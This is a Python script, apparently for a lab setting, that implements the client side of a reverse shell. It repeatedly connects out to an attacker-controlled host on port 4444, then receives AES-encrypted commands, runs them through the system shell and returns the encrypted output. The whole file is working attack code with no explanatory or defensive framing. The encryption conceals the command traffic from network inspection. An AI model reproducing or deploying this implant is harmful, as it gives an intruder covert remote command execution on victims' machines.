import socket
import subprocess
from Crypto.Cipher import AES
import base64
import time

# Encryption Key and IV (must match server)
KEY = b'Sixteen byte key'
IV = b'This is an IV456'

def decrypt(enc):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return cipher.decrypt(base64.b64decode(enc))

def encrypt(raw):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(cipher.encrypt(raw.encode()))

server_ip = '192.168.XXX.XXX'  # Change to Attacker VM IP
server_port = 4444

# Try to connect repeatedly
while True:
    try:
        sock = socket.socket()
        sock.connect((server_ip, server_port))
        break
    except:
        time.sleep(5)

# Command loop
while True:
    try:
        enc_cmd = sock.recv(4096)
        cmd = decrypt(enc_cmd).decode()
        output = subprocess.getoutput(cmd)
        sock.send(encrypt(output))
    except:
        break
